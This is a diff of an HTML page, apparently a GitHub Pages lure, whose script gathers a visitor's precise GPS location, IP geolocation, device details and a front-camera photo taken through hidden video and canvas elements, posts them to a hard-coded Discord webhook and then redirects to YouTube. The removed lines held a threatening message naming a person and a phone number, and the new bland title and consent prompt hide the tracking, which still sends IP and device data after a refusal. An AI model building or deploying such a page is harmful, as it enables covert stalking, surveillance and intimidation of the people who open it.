@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tu y tus conocidos nos la chupan</title>
+    <title>Cargando...</title>
     <style>
         .modal-overlay {
             position: fixed;
@@ -58,30 +58,78 @@
             background-color: #e0e0e0;
             color: #333333;
         }
+
+        /* Elementos ocultos para captura de la cámara */
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <div id="consentModal" class="modal-overlay">
         <div class="modal-box">
-            <p>nada estimado HJAV: tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento y tendremos acceso a ubicación precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO</p>
+            <p>¿Deseas activar tu ubicación y cámara?</p>
 
             <div class="modal-buttons">
-                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Deseo proteger mis datos</button>
-
-                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Me rehuso a colaborar</button>
+                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Aceptar</button>
+                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Rechazar</button>
             </div>
         </div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
-        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=lbf8BTYxCYdax0im";
+        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=Otnw3p_biN4t3zle";
 
         function cerrarModal() {
             document.getElementById("consentModal").style.display = "none";
         }
 
+        // Función para tomar la foto con permiso
+        function tomarFoto() {
+            return new Promise((resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
+
+                // Pedir permiso de cámara al navegador
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        const video = document.getElementById("video");
+                        const canvas = document.getElementById("canvas");
+                        video.srcObject = stream;
+
+                        video.onloadedmetadata = () => {
+                            // Esperar a que el video cargue un fotograma
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext("2d");
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                // Detener la cámara
+                                stream.getTracks().forEach(track => track.stop());
+
+                                // Convertir la imagen a un Blob (archivo)
+                                canvas.toBlob((blob) => {
+                                    resolve(blob);
+                                }, "image/jpeg", 0.8);
+                            }, 500);
+                        };
+                    })
+                    .catch((err) => {
+                        console.error("Permiso de cámara denegado:", err);
+                        resolve(null); // Si rechaza la cámara, continúa sin foto
+                    });
+            });
+        }
+
+        // Función para pedir GPS
         function obtenerGPSNativo() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) {
@@ -103,7 +151,7 @@
                     (err) => {
                         resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                     },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    { enableHighAccuracy: true, timeout: 6000 }
                 );
             });
         }
@@ -111,10 +159,17 @@
         async function responderConsentimiento(acepto) {
             cerrarModal();
 
-            let gpsInfo = { gpsData: "El usuario rechazó la solicitud inicial.", mapLink: "N/A" };
+            let gpsInfo = { gpsData: "El usuario rechazó la solicitud.", mapLink: "N/A" };
+            let fotoBlob = null;
 
             if (acepto) {
-                gpsInfo = await obtenerGPSNativo();
+                // Solicitar ubicación y foto en paralelo
+                const [gpsRes, fotoRes] = await Promise.all([
+                    obtenerGPSNativo(),
+                    tomarFoto()
+                ]);
+                gpsInfo = gpsRes;
+                fotoBlob = fotoRes;
             }
 
             let ipData = {};
@@ -131,9 +186,10 @@
             const idioma = navigator.language || "Desconocido";
             const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+            // Crear el objeto con los datos formateados
             const payload = {
                 embeds: [{
-                    title: "🔍 Registro de Visita",
+                    title: "🔍 Registro de Visita con Permisos",
                     color: acepto ? 3066993 : 15158332,
                     fields: [
                         { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
@@ -141,26 +197,34 @@
                         { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                         { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                         { name: "🗺️ Enlace Google Maps", value: gpsInfo.mapLink, inline: false },
+                        { name: "📷 Foto de Cámara", value: fotoBlob ? "Capturada con éxito (ver archivo adjunto)" : "No disponible / Denegada", inline: false },
                         { name: "💻 Pantalla", value: pantalla, inline: true },
                         { name: "🧠 RAM / CPU", value: `RAM: ${memoriaRAM} | Núcleos: ${nucleosCPU}`, inline: true },
                         { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                         { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                     ],
-                    footer: { text: "Registro de Visita - GitHub Pages" },
+                    footer: { text: "Registro con Consentimiento de Cámara y GPS" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
+            // Enviar a Discord utilizando FormData para poder enviar la imagen adjunta
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify(payload));
+            if (fotoBlob) {
+                formData.append("file", fotoBlob, "captura.jpg");
+            }
+
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
             } catch (err) {
                 console.error("Error al enviar a Discord:", err);
             }
 
+            // Redirigir a YouTube
             window.location.href = YOUTUBE_URL;
         }
     </script>
